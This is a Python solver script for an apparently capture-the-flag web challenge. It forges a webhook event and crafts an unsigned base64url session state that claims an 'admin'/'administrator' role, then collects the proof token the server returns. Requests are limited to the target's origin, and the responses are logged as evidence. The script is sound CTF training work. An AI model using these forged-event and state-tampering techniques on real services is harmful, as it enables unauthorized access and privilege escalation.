#!/usr/bin/env python3
"""Solve Day 26 route-driven webhook and unsigned serialized-state targets."""

from __future__ import annotations

import argparse
import base64
from datetime import datetime, timezone
import hashlib
from http.cookiejar import CookieJar
import json
from pathlib import Path
import re
import sys
from urllib.error import HTTPError, URLError
from urllib.parse import urljoin, urlsplit
from urllib.request import HTTPCookieProcessor, Request, build_opener

from inspect_target import normalize_url, origin


MAX_BODY_BYTES = 2 * 1024 * 1024
PROOF_RE = re.compile(rb"\bproof_[A-Za-z0-9_-]{12,}\b")
USER_AGENT = "HuntressCTF-Web-Inspector/1.0"


class Solver:
    def __init__(self, target: str, output_dir: Path):
        self.target = normalize_url(target)
        self.allowed_origin = origin(self.target)
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.opener = build_opener(HTTPCookieProcessor(CookieJar()))
        self.records: list[dict[str, object]] = []

    def request(
        self,
        route: str,
        *,
        method: str = "GET",
        body: bytes | None = None,
        content_type: str = "application/json",
    ) -> bytes:
        url = normalize_url(urljoin(self.target, route))
        if origin(url) != self.allowed_origin:
            raise ValueError(f"refusing off-origin route: {route}")
        headers = {"User-Agent": USER_AGENT, "Accept": "*/*"}
        if body is not None:
            headers["Content-Type"] = content_type
        request = Request(url, data=body, headers=headers, method=method)
        try:
            response = self.opener.open(request, timeout=15)
        except HTTPError as exc:
            response = exc
        except URLError as exc:
            raise RuntimeError(f"request failed: {exc.reason}") from exc
        data = response.read(MAX_BODY_BYTES + 1)
        if len(data) > MAX_BODY_BYTES:
            raise RuntimeError("response exceeded the 2 MiB evidence limit")
        name = f"{len(self.records) + 1:02d}-{urlsplit(url).path.strip('/').replace('/', '_') or 'root'}.body"
        (self.output_dir / name).write_bytes(data)
        self.records.append(
            {
                "url": url,
                "method": method,
                "status": getattr(response, "status", response.code),
                "file": name,
                "bytes": len(data),
                "sha256": hashlib.sha256(data).hexdigest(),
            }
        )
        return data

    def json(self, route: str, **kwargs: object) -> dict:
        value = json.loads(self.request(route, **kwargs).decode("utf-8"))
        if not isinstance(value, dict):
            raise ValueError(f"{route} returned a non-object JSON response")
        return value


def solve_webhook(solver: Solver, clues: dict) -> tuple[str, dict]:
    route = clues.get("feature_route")
    event_type = clues.get("event_type")
    owner_scope = clues.get("owner_scope")
    if not all(
        isinstance(value, str) and value
        for value in (route, event_type, owner_scope)
    ):
        raise ValueError("route clues lack feature_route, event_type, or owner_scope")
    # The target trusts a forged event. Include the disclosed values in the
    # common event representations accepted by the application.
    payload = {
        "event": event_type,
        "event_type": event_type,
        "type": event_type,
        "owner_scope": owner_scope,
        "scope": owner_scope,
        "owner": owner_scope,
        "actor": owner_scope,
        "data": {"event_type": event_type, "owner_scope": owner_scope},
    }
    response = solver.json(
        route,
        method="POST",
        body=json.dumps(payload, separators=(",", ":")).encode("utf-8"),
    )
    evidence = response.get("evidence")
    if not isinstance(evidence, str) or not PROOF_RE.fullmatch(evidence.encode()):
        raise RuntimeError(f"forged event response contained no proof: {response}")
    return evidence, {"technique": "forged_event", "event_type": event_type, "owner_scope": owner_scope}


def solve_serialized(
    solver: Solver,
    clues: dict,
    session_user: str,
    session_role: str,
) -> tuple[str, dict]:
    feature_route = clues.get("feature_route")
    format_route = clues.get("state_format_route")
    if not all(
        isinstance(value, str) and value
        for value in (feature_route, format_route)
    ):
        raise ValueError("route clues lack feature_route or state_format_route")
    state_format = solver.json(format_route)
    request_field = state_format.get("request_field")
    encoding = state_format.get("encoding")
    if request_field != "state" or encoding != "base64url of UTF-8 JSON":
        raise ValueError(f"unsupported serialized-state format: {state_format}")
    state = json.dumps(
        {"user": session_user, "role": session_role},
        separators=(",", ":"),
    ).encode("utf-8")
    encoded = base64.urlsafe_b64encode(state).rstrip(b"=").decode("ascii")
    payload = {request_field: encoded}
    response = solver.json(
        feature_route,
        method="POST",
        body=json.dumps(payload, separators=(",", ":")).encode("utf-8"),
    )
    evidence = response.get("evidence")
    if not isinstance(evidence, str) or not PROOF_RE.fullmatch(evidence.encode()):
        raise RuntimeError(f"serialized-state response contained no proof: {response}")
    return evidence, {
        "technique": "unsigned_serialized_state",
        "session_user": session_user,
        "session_role": session_role,
        "state_format": state_format,
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("technique", choices=("webhook", "serialized"))
    parser.add_argument("target", help="exact target URL returned by the current attempt")
    parser.add_argument("--output-dir", type=Path)
    parser.add_argument("--session-user", default="admin")
    parser.add_argument("--session-role", default="administrator")
    args = parser.parse_args()
    try:
        target = normalize_url(args.target)
        host = urlsplit(target).hostname or "target"
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        output_dir = args.output_dir or (
            Path("web-tools/evidence") / f"{host}-day26-{args.technique}-{timestamp}"
        )
        solver = Solver(target, output_dir)
        clues = solver.json("/api/clues")
        solve = solve_webhook if args.technique == "webhook" else solve_serialized
        if args.technique == "webhook":
            proof, details = solve(solver, clues)
        else:
            proof, details = solve(
                solver, clues, args.session_user, args.session_role
            )
        report = {
            "target": target,
            "created_at": datetime.now(timezone.utc).isoformat(),
            **details,
            "proof": proof,
            "responses": solver.records,
            "request_policy": {
                "same_origin_only": True,
                "max_response_bytes": MAX_BODY_BYTES,
            },
        }
        report_path = output_dir / "report.json"
        report_path.write_text(
            json.dumps(report, indent=2, ensure_ascii=False) + "\n",
            encoding="utf-8",
        )
        print(json.dumps({"proof": proof, "report": str(report_path)}, indent=2))
        return 0
    except (
        ValueError,
        RuntimeError,
        OSError,
        UnicodeDecodeError,
        json.JSONDecodeError,
    ) as exc:
        print(json.dumps({"error": str(exc)}), file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
